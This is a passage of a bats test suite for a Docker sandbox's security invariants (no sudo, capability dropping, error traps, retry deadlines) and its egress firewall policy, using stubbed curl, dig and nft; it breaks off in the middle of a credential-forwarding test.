#!/usr/bin/env bats
# Fast checks that don't need Docker: catch regressions in the security
# invariants that are visible directly in the repo's files, without paying
# for an image build + container boot. See runtime.bats for everything that
# actually needs a live container.

setup() {
    SANDBOX_DIR="$BATS_TEST_DIRNAME/../docker"
    REPO_ROOT="$BATS_TEST_DIRNAME/.."
    LIB="$REPO_ROOT/bin/dejima-provider-lib.sh"
}

# Runs one function from the provider library in a subshell, the same way
# providers.bats does. A test that reads a manifest must go through the real
# parser rather than grepping the file: the point of most of these is that a
# declared value has an effect, and grep cannot tell a value from a comment
# mentioning one.
lib() { bash -c 'source "$1"; shift; "$@"' _ "$LIB" "$@"; }

# Prose greps go through this, never straight at the file. A sentence in a
# hard-wrapped document contains newlines, and its continuation may be
# indented, so a phrase spanning a wrap matches nothing - the assertion
# fails on a reflow that changed no words. Squeeze after flattening or the
# indent becomes a run of spaces and the same grep still misses. Emphasis
# markers go too: `**word**` is the same prose as `word`.
flat_prose() { tr '\n' ' ' < "$1" | tr -d '*`' | tr -s ' '; }

@test "Dockerfile never installs sudo" {
    run grep -E '^\s*sudo\s*\\?\s*$' "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ]
}

@test "Dockerfile never creates a sudoers entry" {
    run grep -i "sudoers" "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ]
}

@test "Dockerfile creates a SANDBOX_USER matching the host user, not a hardcoded node" {
    grep -qE '^ARG SANDBOX_USER=node\s*$' "$SANDBOX_DIR/Dockerfile"
    grep -qE '^ARG SANDBOX_UID=1000\s*$' "$SANDBOX_DIR/Dockerfile"
    grep -qE '^ARG SANDBOX_GID=1000\s*$' "$SANDBOX_DIR/Dockerfile"
    grep -qE '^ARG SANDBOX_HOME=/home/node\s*$' "$SANDBOX_DIR/Dockerfile"
    grep -q 'useradd -u "$SANDBOX_UID" -g "$SANDBOX_GID" -m -d "$SANDBOX_HOME"' "$SANDBOX_DIR/Dockerfile"
    grep -qE '^ENV SANDBOX_USER=\$SANDBOX_USER\s*$' "$SANDBOX_DIR/Dockerfile"
    grep -qE '^ENV SANDBOX_HOME=\$SANDBOX_HOME\s*$' "$SANDBOX_DIR/Dockerfile"
    # No literal "USER node" anywhere - the mid-build USER switch must use
    # the parametrized variable, not the old hardcoded name.
    run grep -E '^USER\s+node\s*$' "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ]
    grep -qE '^USER\s+\$SANDBOX_USER\s*$' "$SANDBOX_DIR/Dockerfile"
}

@test "entrypoint.sh drops privilege via SANDBOX_USER, not a literal node" {
    run grep -E 'gosu "?node\b|--user="?node\b' "$SANDBOX_DIR/entrypoint.sh"
    [ "$status" -ne 0 ]
    # Both spellings, because the session's own drop is not the gosu one: it
    # goes through capsh, which reduces the bounding set in the same process
    # that changes uid. A check that only knew about gosu would keep passing
    # while the line it is really about named a literal user.
    grep -q 'gosu "$SANDBOX_USER"' "$SANDBOX_DIR/entrypoint.sh"
    grep -q -- '--user="$SANDBOX_USER"' "$SANDBOX_DIR/entrypoint.sh"
}

@test "nothing that outlives the entrypoint is started without dropping capabilities" {
    # The session and log-shipper.sh are the two processes that survive the
    # root phase, and the point of drop_caps is that neither inherits the
    # bounding set that phase needed. A `gosu`/bare exec creeping back in for
    # either is the regression, and it is invisible at runtime: the container
    # comes up and works, holding capabilities nothing asked for.
    grep -q 'drop_caps --user="$SANDBOX_USER" -- -c .exec "\$@". dejima \$SANDBOX_CMD' \
        "$SANDBOX_DIR/entrypoint.sh" \
        || { echo "the session is not exec'd through drop_caps"; return 1; }
    grep -q 'drop_caps .*log-shipper\.sh &' "$SANDBOX_DIR/firewall-up.sh" \
        || { echo "log-shipper.sh is not started through drop_caps"; return 1; }
    run grep -nE '^\s*(exec )?gosu "\$SANDBOX_USER" (\$SANDBOX_CMD|sleep)' \
        "$SANDBOX_DIR/entrypoint.sh"
    [ "$status" -ne 0 ] \
        || { echo "a session exec still goes through gosu: $output"; return 1; }
}

@test "capsh is a declared package, not a dependency of something else" {
    # entrypoint.sh refuses to start without it, so an image built without it
    # is a container that never appears. It arrived here as a dependency of
    # iproute2, which is exactly the kind of thing an unrelated package change
    # takes away.
    grep -qE '^\s+libcap2-bin \\$' "$SANDBOX_DIR/Dockerfile" \
        || { echo "libcap2-bin is not in the Dockerfile's package list"; return 1; }
}

@test "Playwright is installed and importable globally" {
    # A global npm install only puts the CLI on PATH, not the module anywhere
    # either of Node's resolvers will find from a script with no local
    # node_modules of its own. The symlink at the filesystem root is what does
    # that (see runtime.bats for the actual launch test).
    grep -q 'npm install -g playwright' "$SANDBOX_DIR/Dockerfile"
    grep -qE '^\s*RUN ln -s \S+ /node_modules$' "$SANDBOX_DIR/Dockerfile"
}

# One awk pass rather than a grep chain: a filtering grep exits 1 when it
# discards every line, which here is the "nothing wrong" case, so the chain
# would report its own success as a failure. Comment lines are skipped - one
# of them quotes, verbatim, the invocation the second test bans.
@test "every build-time download in the Dockerfile retries rather than dying on one blip" {
    # These fetches all sit below the SANDBOX_* ARGs, so any build overriding
    # one of those - test/runtime.bats' first test, or simply a host whose uid
    # isn't 1000 - invalidates the cache and re-runs every one of them. The
    # odds that matter are then the odds of *any* of them blipping, not of a
    # particular one, and a single-shot fetch turns that into a dead build.
    local unguarded
    unguarded=$(awk '
        /^[[:space:]]*#/ { next }
        /wget/ && !/--tries=[0-9]/ { print FNR": "$0 }
        /curl/ && !/--retry [0-9]/ { print FNR": "$0 }
    ' "$SANDBOX_DIR/Dockerfile")
    [ -z "$unguarded" ] || {
        echo "these downloads have no retry flags:" >&2
        echo "$unguarded" >&2
        false
    }
}

# The runtime counterpart of the test above. Build-time downloads have had a
# retry guard for a while; the fetches that run on every container START had
# nothing, which is the worse place for it - a dead build is obvious, and a
# container that never comes up reads as the sandbox being broken.
@test "every fetch in the container's startup path has a deadline" {
    # curl has no default overall timeout. --connect-timeout alone is not one
    # either: it bounds reaching the far end, not a transfer that connects and
    # then stalls, which is the shape that hangs a startup indefinitely.
    local unguarded
    unguarded=$(awk '
        /^[[:space:]]*#/ { next }
        /curl/ && /https?:\/\// && !/--max-time [0-9]/ { print FILENAME": "FNR": "$0 }
    ' "$SANDBOX_DIR"/*.sh)
    [ -z "$unguarded" ] || {
        echo "these runtime fetches have no --max-time, so they can hang a container start:" >&2
        echo "$unguarded" >&2
        false
    }
}


@test "the forge ranges fetch reports its own failure instead of letting set -e swallow it" {
    # egress-policy runs under `set -Eeuo pipefail`, so a bare `var=$(curl ...)`
    # that fails takes the whole script down ON THE ASSIGNMENT - before any of
    # the diagnostics written for exactly that case can run. The container then
    # exits having printed nothing, and the only symptom anyone sees is that the
    # sandbox did not start. It cost two CI rounds to not diagnose (#59).
    #
    # The fix is to capture curl's status rather than let set -e have it, so
    # this checks the fetch is not a bare assignment again.
    grep -q 'set -Eeuo pipefail' "$SANDBOX_DIR/egress-policy"
    # Continuations are joined before matching: the fetch spans several lines,
    # and the `||` that makes it safe is on the last one - so a line-at-a-time
    # pass would report the correct form as the broken one.
    local bare
    bare=$(awk '
        /^[[:space:]]*#/ { next }
        {
            line = $0
            while (line ~ /\\[[:space:]]*$/) {
                sub(/\\[[:space:]]*$/, "", line)
                if ((getline nxt) <= 0) break
                line = line nxt
            }
            if (line ~ /[a-z_]+=\$\(curl/ && line !~ /\|\|/) print FNR": "line
        }
    ' "$SANDBOX_DIR/egress-policy")
    [ -z "$bare" ] || {
        echo "a curl is still assigned directly, so set -e can kill the script:" >&2
        echo "$bare" >&2
        false
    }
}


@test "every startup script reports where it aborted instead of dying silently" {
    # `set -e` alone aborts with no output whatsoever. For a script that runs
    # during container startup that is the worst possible failure mode: the
    # container just never appears, and every cause - a failed lookup, a
    # rejected ruleset, an unreachable API - presents identically, as "the
    # sandbox is broken". Three CI failures were spent on two different
    # instances of it.
    #
    # log-shipper.sh is deliberately absent: it does not use -e at all, on
    # purpose, because one bad line should not kill the tailer.
    local script
    for script in egress-policy firewall-up.sh filter-entrypoint.sh entrypoint.sh; do
        # -E, not just -e: without errtrace the handler does not fire inside
        # functions or subshells, which is where the fetch and the loops live.
        grep -qE '^set -Eeuo pipefail$' "$SANDBOX_DIR/$script" \
            || { echo "$script does not set -E, so its ERR trap would not fire in functions" >&2; false; }
        grep -q "trap .*ERR" "$SANDBOX_DIR/$script" \
            || { echo "$script has no ERR trap - a set -e abort in it would be silent" >&2; false; }
        # Naming itself matters: several scripts run back to back into the same
        # log, and "aborted at line 128" is useless without knowing whose.
        grep -q "aborted at line" "$SANDBOX_DIR/$script"
        grep -q "$script aborted" "$SANDBOX_DIR/$script" \
            || { echo "$script's ERR trap does not name $script" >&2; false; }
    done
}

@test "nothing in the container's startup path pipes into an early-exiting reader" {
    # `producer | grep -q PATTERN` under `set -o pipefail` fails when it
    # SUCCEEDS: grep -q leaves the moment it matches, the producer takes
    # SIGPIPE and exits 141, and pipefail makes that the pipeline's status. It
    # is invisible while the output is small enough that the producer finishes
    # writing first, which is why it shipped - and it appeared the moment a
    # ruleset carried a forge's published ranges, as a policy that had been
    # applied correctly refusing to confirm its own default-drop.
    #
    # `head -N` and `grep -m N` have the same shape for the same reason.
    #
    # Matched on joined continuations, because these pipelines wrap.
    local offenders
    offenders=$(awk '
        /^[[:space:]]*#/ { next }
        {
            line = $0
            while (line ~ /(\||\\)[[:space:]]*$/) {
                if ((getline nxt) <= 0) break
                sub(/\\[[:space:]]*$/, "", line)
                line = line nxt
            }
            if (line ~ /\|[[:space:]]*(grep[^|]*-[a-zA-Z]*q|head[[:space:]]|head$|grep[^|]*-m[[:space:]]*[0-9])/)
                print FILENAME": "FNR": "line
        }
    ' "$SANDBOX_DIR"/*.sh "$SANDBOX_DIR/egress-policy")
    [ -z "$offenders" ] || {
        echo "these pipelines fail when they match, under pipefail:" >&2
        echo "$offenders" >&2
        echo "capture the output first, or use a herestring - see docker/egress-policy." >&2
        false
    }
}


@test "the ERR trap actually resolves the line and the command" {
    # Extracted from the real file rather than retyped, so a trap that has been
    # broken into single quotes - which would expand $LINENO and $BASH_COMMAND
    # at definition time and report the trap's own line forever - fails here.
    local trapline
    trapline=$(grep -m1 "trap .*ERR" "$SANDBOX_DIR/egress-policy")
    cat > "$BATS_TEST_TMPDIR/probe.sh" <<EOF
set -Eeuo pipefail
$trapline
echo "applying the policy..."
false
echo "should not be reached"
EOF
    run bash "$BATS_TEST_TMPDIR/probe.sh"
    [ "$status" -ne 0 ]
    [[ "$output" != *"should not be reached"* ]]
    [[ "$output" == *"egress-policy aborted at line 4"* ]] \
        || { echo "trap did not report the failing line:" >&2; echo "$output" >&2; false; }
    [[ "$output" == *"false"* ]] \
        || { echo "trap did not report the failing command:" >&2; echo "$output" >&2; false; }
}
# The behaviour behind the two greps above, driven for real. egress-policy
# cannot be sourced - it would try to change the packet filter - so the function
# is extracted and run against a stubbed curl. No container, no network.
#
# `sleep` is shadowed by a no-op: the retry delays are deliberate in production
# and pure cost here.
run_fetch() {
    local behaviour="$1"
    STUB_DIR="$BATS_TEST_TMPDIR/stub"
    mkdir -p "$STUB_DIR"
    cp "$behaviour" "$STUB_DIR/curl"
    chmod +x "$STUB_DIR/curl"
    PATH="$STUB_DIR:$PATH"
    sleep() { :; }
    say() { printf '%s\n' "$*" >&2; }
    die() { printf 'FAILED: %s\n' "$*" >&2; exit 1; }
    FORGE_META_URL="https://forge.example/meta"
    FORGE_META_FILTER='[.git[]?, .api[]?, .web[]?] | unique | .[]'
    FORGE_META_AUTH=""
    FETCH_ATTEMPTS=3
    FETCH_TIMEOUT=5
    eval "$(sed -n '/^fetch_forge_ranges()/,/^}/p' "$SANDBOX_DIR/egress-policy")"
    fetch_forge_ranges "$BATS_TEST_TMPDIR/meta" && cat "$BATS_TEST_TMPDIR/meta"
}

# A minimal but structurally valid /meta response - enough for the filter the
# function applies to decide the body carried ranges.
meta_json() {
    printf '{"web":["192.0.2.0/24"],"api":["192.0.2.0/24"],"git":["192.0.2.0/24"]}'
}

# Writes a body to wherever curl was told to --output, and prints the status
# code curl's --write-out would have. Both are what the real fetch reads.
stub_curl() {
    local status_code="$1" body="$2" extra="${3:-}"
    cat > "$BATS_TEST_TMPDIR/stubsrc" <<EOF
#!/bin/bash
$extra
out=""
while [ \$# -gt 0 ]; do
    case "\$1" in --output) out="\$2"; shift 2 ;; *) shift ;; esac
done
printf '%s' '$body' > "\$out"
printf '%s' '$status_code'
EOF
    printf '%s' "$BATS_TEST_TMPDIR/stubsrc"
}


@test "the ranges fetch returns the body when the forge answers" {
    run run_fetch "$(stub_curl 200 "$(meta_json)")"
    [ "$status" -eq 0 ]
    [[ "$output" == *"$(meta_json)"* ]]
}


@test "the ranges fetch reports a failing curl rather than dying on the assignment" {
    # 28 is curl's operation-timeout. Before the fix this case never reached a
    # message at all: set -e took the script down on the assignment itself.
    cat > "$BATS_TEST_TMPDIR/timeout" <<'EOF'
#!/bin/bash
echo "curl: (28) Operation timed out" >&2
exit 28
EOF
    run run_fetch "$BATS_TEST_TMPDIR/timeout"
    [ "$status" -ne 0 ]
    [[ "$output" == *"attempt 1/3"* ]]
    [[ "$output" == *"attempt 3/3"* ]]
    [[ "$output" == *"curl exit 28"* ]]
    # curl's own reason has to survive too - it is the difference between
    # "the forge was slow" and "DNS is broken in here".
    [[ "$output" == *"Operation timed out"* ]]
}


@test "the ranges fetch retries an API error body and surfaces its message" {
    # A rate limit answers with a message and no ranges, sometimes over a 200,
    # so curl exits 0 and only a check on the BODY catches it. A burst of
    # container starts is exactly what trips it, and it clears on its own - so
    # it has to be retried, which curl's own --retry could not do. That is why
    # the body check lives inside the retry loop rather than after it.
    run run_fetch "$(stub_curl 200 '{"message":"API rate limit exceeded"}')"
    [ "$status" -ne 0 ]
    [[ "$output" == *"API rate limit exceeded"* ]]
    [[ "$output" == *"attempt 3/3"* ]]
}

@test "a 403 rate limit is retried and reported by status, not treated as fatal" {
    # The other spelling of the same thing: the primary limit answers 403 with
    # the message in the body, so the status check catches it first.
    run run_fetch "$(stub_curl 403 '{"message":"API rate limit exceeded"}')"
    [ "$status" -ne 0 ]
    [[ "$output" == *"http 403"* ]]
    [[ "$output" == *"attempt 3/3"* ]]
}


@test "the ranges fetch recovers when a later attempt succeeds" {
    # The point of retrying at all: one blip must cost seconds, not the launch.
    cat > "$BATS_TEST_TMPDIR/flaky" <<EOF
#!/bin/bash
n="\$BATS_TEST_TMPDIR/attempts"
count=\$(cat "\$n" 2>/dev/null || echo 0)
echo \$((count + 1)) > "\$n"
out=""
while [ \$# -gt 0 ]; do
    case "\$1" in --output) out="\$2"; shift 2 ;; *) shift ;; esac
done
if [ "\$count" -lt 1 ]; then exit 7; fi
printf '%s' '$(meta_json)' > "\$out"
printf '200'
EOF
    run run_fetch "$BATS_TEST_TMPDIR/flaky"
    [ "$status" -eq 0 ]
    [[ "$output" == *"attempt 1/3"* ]]
    [[ "$output" == *"curl exit 7"* ]]
    [[ "$output" == *"$(meta_json)"* ]]
}
# The same harness for the other half: what happens to a permitted name that
# does not come back the way the policy needs. Two outcomes have to stay
# distinct, and conflating them is how a container either dies over nothing or
# survives having quietly lost a destination.
#
#   the name returns nothing        reported, and the session continues - the
#                                   world is allowed to be down
#   the policy refused the answer   the container stops, naming the entry - two
#                                   halves of the operator's own configuration
#                                   disagree, and that does not fix itself
#
# check_permitted_names is extracted and run against a stubbed dig and a
# hand-written resolver log, which is exactly what it reads.
run_check_names() {
    local entries="$1" resolver_log="$2" dig_behaviour="$3" nft_behaviour="${4:-}"
    local script="$BATS_TEST_TMPDIR/run-check.sh" table hint
    STUB_DIR="$BATS_TEST_TMPDIR/stub"
    mkdir -p "$STUB_DIR"
    cp "$dig_behaviour" "$STUB_DIR/dig"
    chmod +x "$STUB_DIR/dig"
    # The sweep reads the address sets back. Stubbed rather than left to the
    # machine's own nft, which in a sandbox answers for a table that is not
    # there - so every name would look stranded and every test here would fail
    # for a reason none of them is about. Default: every address is where its
    # class says it should be.
    if [ -n "$nft_behaviour" ]; then
        cp "$nft_behaviour" "$STUB_DIR/nft"
    else
        printf '#!/bin/sh\nexit 0\n' > "$STUB_DIR/nft"
    fi
    chmod +x "$STUB_DIR/nft"

    # Read out of the sources rather than written here, so the table the stub is
    # asked about and the name the message offers an operator cannot drift from
    # what the policy and the launch really use.
    table="$(sed -n 's/^readonly TABLE=\([^ ]*\).*$/\1/p' "$SANDBOX_DIR/egress-policy")"
    [ -n "$table" ] || { echo "egress-policy no longer declares a table name"; return 1; }
    hint="$(sed -n "s/^EGRESS_INTERNAL_OK_HINT='\(.*\)'$/\1/p" "$SANDBOX_DIR/firewall-up.sh")"
    [ -n "$hint" ] || { echo "firewall-up.sh supplies no name for the exemption list"; return 1; }

    # A real child shell, with the options egress-policy sets, rather than the
    # function evaluated here.
    #
    # bats runs a test with errexit off, and `set -e` inside a subshell of that
    # shell does not restore it - measured, not assumed. So evaluating the
    # function in this process runs it somewhere more forgiving than production,
    # and a command substitution that fails is an ordinary outcome here while it
    # aborts the policy there. That is not hypothetical: it shipped, the suite
    # stayed green, and every container refused to start.
    {
        printf 'set -Eeuo pipefail\n'
        printf 'say() { printf "%%s\\n" "$*" >&2; }\n'
        printf 'die() { printf "FAILED: %%s\\n" "$*" >&2; exit 1; }\n'
        printf 'ENTRIES_FILE=%q\n' "$entries"
        printf 'RESOLVER_LOG=%q\n' "$resolver_log"
        printf 'TABLE=%q\n' "$table"
        printf 'INTERNAL_OK_HINT=%q\n' "$hint"
        sed -n '/^set_for_class()/,/^}/p' "$SANDBOX_DIR/egress-policy"
        sed -n '/^resolve_one()/,/^}/p' "$SANDBOX_DIR/egress-policy"
        sed -n '/^check_permitted_names()/,/^}/p' "$SANDBOX_DIR/egress-policy"
        printf 'check_permitted_names "check N"\n'
    } > "$script"

    PATH="$STUB_DIR:$PATH" bash "$script"
}


@test "a permitted name that resolves leaves the check with nothing to say" {
    printf 'open name strict files.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    : > "$BATS_TEST_TMPDIR/resolver.log"
    cat > "$BATS_TEST_TMPDIR/dig" <<'EOF'
#!/bin/bash
echo "192.0.2.7"
EOF
    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" "$BATS_TEST_TMPDIR/dig"
    [ "$status" -eq 0 ]
    [[ "$output" != *"FAILED"* ]]
    [[ "$output" != *"returned no address"* ]]
}


@test "a name in both classes is recorded once, in the narrower one" {
    # release-assets.githubusercontent.com is an open-class entry of the
    # component's own and also sits under a forge suffix, so it reaches both
    # lists; a harness or backend domain under one would do the same. Two lines
    # meant two resolver lines naming different sets for one name, of which the
    # resolver honours one - so nothing could say which class was in force, and
    # the check that reads an answer back out of its class's set would look in
    # the set that lost.
    local out
    out=$(bash -c '
        TABLE=t; ENTRIES_FILE="$2/ents"
        FORGE_ENTRIES="github.com githubusercontent.com release-assets.githubusercontent.com"
        OPEN_ENTRIES="registry.npmjs.org release-assets.githubusercontent.com crates.io"
        INTERNAL_OK=""; INTERNAL_OK_HINT=hint
        die() { echo "DIE: $*" >&2; exit 1; }
        say() { :; }
        eval "$(sed -n "/^classify_entry()/,/^}/p" "$1")"
        eval "$(sed -n "/^record_entries()/,/^}/p" "$1")"
        eval "$(sed -n "/^build_entries()/,/^}/p" "$1")"
        build_entries forge.example.com
        cat "$ENTRIES_FILE"
    ' _ "$SANDBOX_DIR/egress-policy" "$BATS_TEST_TMPDIR") \
        || { echo "build_entries failed: $out"; return 1; }

    local n
    n=$(awk '$4 == "release-assets.githubusercontent.com"' <<< "$out" | wc -l)
    [ "$n" -eq 1 ] || { echo "recorded $n times, not once:"; echo "$out"; return 1; }
    awk '$4 == "release-assets.githubusercontent.com" {print $1}' <<< "$out" | grep -qx forge \
        || { echo "the overlapping name did not keep the narrower class:"; echo "$out"; return 1; }

    # And nothing else was lost to the deduplication.
    for n in github.com registry.npmjs.org crates.io forge.example.com; do
        grep -q " $n\$" <<< "$out" || { echo "$n is missing:"; echo "$out"; return 1; }
    done
}

@test "a lookup that answers with no address does not abort the policy" {
    # The other empty-answer path, and the one that is not exercised by a dig
    # that fails: here the lookup succeeds and carries no A record, so
    # resolve_one returns non-zero, which under the policy's own `set -e` will
    # abort an assignment that does not handle it. That shipped - the suite was
    # green and every container refused to start, because this harness ran the
    # function in a more forgiving shell than production does.
    printf 'open name strict noaddr.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    : > "$BATS_TEST_TMPDIR/resolver.log"
    printf '#!/bin/bash\nexit 0\n' > "$BATS_TEST_TMPDIR/dig"

    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" \
        "$BATS_TEST_TMPDIR/dig"
    [ "$status" -eq 0 ] \
        || { echo "a name that answered with no address stopped the policy: $output"; return 1; }
    [[ "$output" == *"returned no address"* ]] \
        || { echo "it was not reported either: $output"; return 1; }
}

@test "a permitted name whose address never reached its class's set stops the launch" {
    # The property nothing else asserts. Reading the code cannot: the class the
    # entry was recorded with, the resolver line built from it, and the set the
    # ports are keyed to are three separate statements, and each can be right
    # about a different set. Every defect of that shape in this area reached a
    # green suite.
    #
    # Fatal, unlike a name that did not answer: that is the world being down,
    # this is the policy disagreeing with itself, and the session it produces
    # reaches a permitted destination only by accident or not at all.
    printf 'forge name strict forge.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    : > "$BATS_TEST_TMPDIR/resolver.log"
    printf '#!/bin/bash\necho 192.0.2.7\n' > "$BATS_TEST_TMPDIR/dig"
    # In no set at all: the answer resolved and was never added.
    printf '#!/bin/sh\nexit 1\n' > "$BATS_TEST_TMPDIR/nft"

    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" \
        "$BATS_TEST_TMPDIR/dig" "$BATS_TEST_TMPDIR/nft"
    [ "$status" -ne 0 ] || { echo "a stranded name did not stop the launch: $output"; return 1; }
    [[ "$output" == *forge.example.com* && "$output" == *192.0.2.7* ]] \
        || { echo "the failure names neither the entry nor its address: $output"; return 1; }
    [[ "$output" == *fname_v4* ]] \
        || { echo "the failure does not say which set was expected: $output"; return 1; }
}

@test "a forge name that landed in the open class's set is caught, not just a missing one" {
    # The class bug, which is the one that actually happened - twice. The
    # address is in a set, so a check that only asked "is it permitted at all"
    # would pass; the ports come from WHICH set, so it has to be the right one.
    printf 'forge name strict forge.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    : > "$BATS_TEST_TMPDIR/resolver.log"
    printf '#!/bin/bash\necho 192.0.2.7\n' > "$BATS_TEST_TMPDIR/dig"
    cat > "$BATS_TEST_TMPDIR/nft" <<'EOF'
#!/bin/sh
# Present in the open class's set, absent from the forge's.
case "$*" in
    *oname_v4*) exit 0 ;;
    *) exit 1 ;;
esac
EOF
    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" \
        "$BATS_TEST_TMPDIR/dig" "$BATS_TEST_TMPDIR/nft"
    [ "$status" -ne 0 ] \
        || { echo "a forge name in the wrong class's set was accepted: $output"; return 1; }
    [[ "$output" == *"class forge"* ]] \
        || { echo "the failure does not name the class: $output"; return 1; }
}

@test "the set a class feeds has one definition, used to fill it and to read it back" {
    # The recurring failure in this area is a rule applied in one of the places
    # that needs it. If the resolver config and the verification each named a
    # set, they could name different ones and the check would pass while the
    # class meant nothing.
    local p="$SANDBOX_DIR/egress-policy"
    [ "$(grep -c 'fname_v4' <<< "$(sed -n '/^set_for_class()/,/^}/p' "$p")")" -eq 1 ] \
        || { echo "set_for_class does not name the forge set exactly once"; return 1; }
    grep -q 'sets="4#inet#\$TABLE#\$(set_for_class' "$p" \
        || { echo "the resolver config does not get its set from set_for_class"; return 1; }
    grep -q 'want=\$(set_for_class "\$class")' "$p" \
        || { echo "the sweep does not get its set from set_for_class"; return 1; }
    # Including the live add, which named its own set for a while after this
    # comment claimed it did not. A `dejima-allow` looking in a different set
    # from the one being filled reports a permitted name as unreachable, or the
    # reverse.
    [ "$(grep -c 'set_prefix' "$p")" -eq 0 ] \
        || { echo "something still spells a set name for itself:"; grep -n 'set_prefix' "$p"; return 1; }
    sed -n '/^permit_name()/,/^}/p' "$p" | grep -q 'set_for_class' \
        || { echo "the live add does not get its set from set_for_class"; return 1; }

    # And the function answers correctly for both classes, driven rather than read.
    run bash -c 'eval "$(sed -n "/^set_for_class()/,/^}/p" "$1")"; set_for_class forge; echo; set_for_class open' _ "$p"
    [ "${lines[0]}" = fname_v4 ] || { echo "forge class maps to ${lines[0]}"; return 1; }
    [ "${lines[1]}" = oname_v4 ] || { echo "open class maps to ${lines[1]}"; return 1; }
}

@test "a permitted name that resolves nowhere is reported, and the session continues" {
    # The world is allowed to be down. A name whose host is unreachable, or
    # which simply does not exist yet, must not cost the launch - the sandbox
    # would be refusing to start over something outside the operator's control.
    printf 'open name strict gone.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    : > "$BATS_TEST_TMPDIR/resolver.log"
    cat > "$BATS_TEST_TMPDIR/dig" <<'EOF'
#!/bin/bash
exit 9
EOF
    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" "$BATS_TEST_TMPDIR/dig"
    [ "$status" -eq 0 ] || { echo "$output" >&2; false; }
    [[ "$output" == *"gone.example.com"* ]]
    [[ "$output" == *"returned no address"* ]]
    # And it must say which condition this is, because the other one below
    # looks identical from an empty answer and has a completely different fix.
    [[ "$output" == *"not a policy refusal"* ]]
}



@test "a permitted name the policy itself refuses stops the container, naming it" {
    # The other condition: the name resolved, and the policy refused the answer
    # because it points inside a private network. That is two halves of the
    # operator's own configuration disagreeing, it does not fix itself, and
    # left to runtime it surfaces hours later as one tool mysteriously failing.
    #
    # The stub appends the refusal as it answers, which is the real ordering -
    # the resolver logs it while serving the very lookup this check makes. A
    # fixture that wrote the line beforehand would be testing nothing, because
    # the check deliberately reads only what its own sweep produced.
    printf 'open name strict mirror.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    : > "$BATS_TEST_TMPDIR/resolver.log"
    cat > "$BATS_TEST_TMPDIR/dig" <<EOF
#!/bin/bash
echo "Sep 12 01:02:03 dnsmasq[7]: possible DNS-rebind attack detected: mirror.example.com" \
    >> "$BATS_TEST_TMPDIR/resolver.log"
exit 0
EOF
    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" "$BATS_TEST_TMPDIR/dig"
    [ "$status" -ne 0 ] || { echo "a refused answer did not stop the container:" >&2; echo "$output" >&2; false; }
    [[ "$output" == *"mirror.example.com"* ]]
    # The remedy has to be something the operator can act on. The variable the
    # policy reads is its interface with whatever launched it, and nobody sets
    # it by hand - so the launcher supplies the name of the key they do set,
    # and the message uses that.
    [[ "$output" == *"[core] internal_domains"* ]] \
        || { echo "the refusal does not name a remedy the operator can act on:" >&2; echo "$output" >&2; false; }
}



@test "the refusal check reads only the lines this run produced" {
    # The resolver log outlives an earlier apply in the same container, so a
    # refusal already in it must not fail a launch that is fine. Same fixture
    # as the test above except for WHEN the line is written, which is the whole
    # difference between a stale record and a live one.
    printf 'open name strict mirror.example.com\n' > "$BATS_TEST_TMPDIR/entries"
    cat > "$BATS_TEST_TMPDIR/resolver.log" <<'EOF'
Sep 12 00:00:01 dnsmasq[7]: possible DNS-rebind attack detected: mirror.example.com
EOF
    cat > "$BATS_TEST_TMPDIR/dig" <<'EOF'
#!/bin/bash
echo "192.0.2.9"
EOF
    run run_check_names "$BATS_TEST_TMPDIR/entries" "$BATS_TEST_TMPDIR/resolver.log" "$BATS_TEST_TMPDIR/dig"
    [ "$status" -eq 0 ] \
        || { echo "a stale refusal from an earlier run failed this one:" >&2; echo "$output" >&2; false; }
}


@test "each lookup is bounded, so one unanswered name cannot eat the startup budget" {
    # dig's defaults are 5s x 3 tries. Every permitted name is resolved at
    # start, so unbounded lookups turn a handful of slow ones into a startup
    # the test suite's 120s does not cover.
    grep -qE 'dig .*\+time=[0-9]+ \+tries=[0-9]+' "$SANDBOX_DIR/egress-policy"
}


@test "the permitted names are resolved before the session starts, not on first use" {
    # Two things at once: a disagreement inside the operator's configuration is
    # found while there is still something to report it to, and the address
    # sets are warm, so the first thing the agent does is not waiting on a cold
    # lookup. Both are properties of doing it during apply.
    grep -q 'check_permitted_names' "$SANDBOX_DIR/egress-policy" \
        || { echo "nothing checks the permitted names at start" >&2; false; }
    local in_verify
    in_verify=$(sed -n '/^verify()/,/^}/p' "$SANDBOX_DIR/egress-policy" | grep -c 'check_permitted_names')
    [ "$in_verify" -ge 1 ] \
        || { echo "check_permitted_names is defined but never run from verify()" >&2; false; }
}


@test "an empty response is reported as carrying no ranges, not as a transport failure" {
    # curl exits 0 and the status is 200; only the body says anything is wrong.
    run run_fetch "$(stub_curl 200 '')"
    [ "$status" -ne 0 ]
    [[ "$output" == *"carried no ranges"* ]]
}

@test "the ranges fetch sends the launcher's credential when it has one" {
    # Unauthenticated, the default endpoint is rate-limited per source address
    # across everything on the host, so a host starting sandboxes in a loop
    # exhausts it and every launch after that fails on a credential that was
    # available.
    cat > "$BATS_TEST_TMPDIR/echoargs" <<'EOF'
#!/bin/bash
out=""
argv="$*"
while [ $# -gt 0 ]; do
    case "$1" in --output) out="$2"; shift 2 ;; *) shift ;; esac
done
printf '%s' "$argv" > "$BATS_TEST_TMPDIR/seen-args"
printf '{"web":["192.0.2.0/24"],"api":["192.0.2.0/24"],"git":["192.0.2.0/24"]}' > "$out"
printf '200'
EOF
    FORGE_META_AUTH_OVERRIDE="Authorization: Bearer probe-token" \
        run bash -c '
            source "$1"
            FORGE_META_AUTH="Authorization: Bearer probe-token"
            run_fetch "$2" >/dev/null 2>&1 || true
